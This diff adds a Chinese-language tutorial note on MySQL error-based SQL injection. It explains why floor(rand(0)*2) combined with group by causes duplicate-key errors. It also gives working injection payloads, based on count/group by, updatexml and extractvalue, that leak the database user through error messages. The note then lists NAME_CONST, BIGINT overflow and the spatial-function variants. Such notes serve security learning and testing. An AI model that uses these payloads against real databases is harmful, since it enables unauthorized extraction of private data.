@@ -1,1 +1,78 @@
+### 基于报错注入：
+程序将数据库的返回错误信息直接显示在页面中，虽然没有返回数据库的查询结果，但是可以构造一些报错语句从错误信息中获取想要的结果。
+##### 1. 重复数据报错
+###### 1.1 基于主键的唯一性：
+如果一个表尝试生成两个相同的主键，就会爆出主键重复错误：
+`Duplicate entry '1' for key 'group_key'`
+利用 `floor(rand(0)*2)` 等注入手法
+
+---- 原理：
+通过多次测试观察发现，每次执行
+`select rand(0) from information_schema.tables limit x,3;`
+rand(0)产生的值都是固定的。
+```
+mysql> select rand(0) from information_schema.tables limit 0,3;
++---------------------+
+| rand(0)              |
++---------------------+
+| 0.15522042769493574  |
+| 0.620881741513388    |
+| 0.6387474552157777   |
++---------------------+
+3 rows in set (0.00 sec)
+mysql> select rand(0) from information_schema.tables limit 3,3;
++---------------------+
+| rand(0)              |
++---------------------+
+| 0.15522042769493574  |
+| 0.620881741513388    |
+| 0.6387474552157777   |
++---------------------+
+3 rows in set (0.00 sec)
+mysql> select rand(0) from information_schema.tables limit 6,3;
++---------------------+
+| rand(0)              |
++---------------------+
+| 0.15522042769493574  |
+|  0.620881741513388   |
+|  0.6387474552157777  |
++---------------------+
+3 rows in set (0.00 sec)
+```
+---- 构造一个报`Duplicate`的错误的SQL语句：
+```
+select count(*) from information_schema.tables group by floor(rand(0)*2);
+ERROR 1062 (23000): Duplicate entry '1' for key 'group_key'
+```
+当进行`count(*),group by`计算时，MySQL会创建一个虚拟表，虚拟表由主键列和`count(*)`两列组成，同时`floor(rand(0)*2)`会被计算多次，
+计算多次是指在取数据使用`group by`时，进行一次`floor(rand(0)*2)`，
+如果虚拟表中不存在此数据时，那么在往虚拟表插入数据时，`floor(rand(0)*2)`将会再被计算一次。
+
+接下来分析,取数据表第一条记录时第一次使用`group by`,计算`floor(rand(0)*2)`的值为0,查询虚拟表发现0这个主键不存在,于是再次计算`floor(rand(0)*2)`结果为1,将1作为主键插入虚拟表,这时主键1的`count(*)`值为1,接下来取数据表第二条记录时第二次使用`group by`,计算`floor(rand(0)*2)`,结果为1,然后查询虚拟表,发现1的键值存在,于是`count(*)`的值加1,取数据表第三条记录时第三次使用`group by`,计算`floor(rand(0)*2)`值为0,查询虚拟表,发现0的键值不存在,于是再一次计算`floor(rand(0)*2)`,结果为1,当尝试将1插入虚拟表中时,发现主键1已经存在,所以报出主键重复的错误,整个过程中查询了`information_schema.tables`这个表3条记录发生报错,这也是报错为什么需要数据表的记录多到至少为3条的原因
+
+---- 实际使用的操作SQL语句：
+```
+select * from user where id=1 and (select count(*) from information_schema.tables group by concat(floor(rand(0)*2),0x3a,user()));
+ERROR 1062 (23000): Duplicate entry '1:root@localhost' for key 'group_key'
+```
+`'1:root@localhost'` 这里就显示出了隐私数据。
+
+###### 1.2 基于列名的唯一性
+如果我们在一个表中构造了两个相同的列名，就会产生`Duplicate column name`的错误，
+利用`NAME_CONST`，或利用`join`和`using`关键字连接同一个表创建子查询进行报错。
+##### 2. 基于类型不一致报错
+MySQL的一些函数参数要求的是什么数据类型，如果数据类型不符合就会报错
+利用`updatexml`，`extractvalue`等注入手法
+```
+mysql> select * from user where id=1 and updatexml(1,(concat(1,user())),1);
+ERROR 1105 (HY000): XPATH syntax error: 'root@localhost'
+```
+```
+mysql> select * from user where id=1 and extractvalue(1,(concat(1,user())));
+ERROR 1105 (HY000): XPATH syntax error: 'root@localhost'
+```
+##### 3. 基于BIGINT溢出错误的SQL注入，根据超出最大整数溢出产生的错误、
+##### 4. 一些MySQL空间函数
+`geometrycollection(),multipoint(),polygon(),multipolygon(),linestring(),multilinestring()，`
+通过这些报错会产生`Illegal non geometric`错误
 
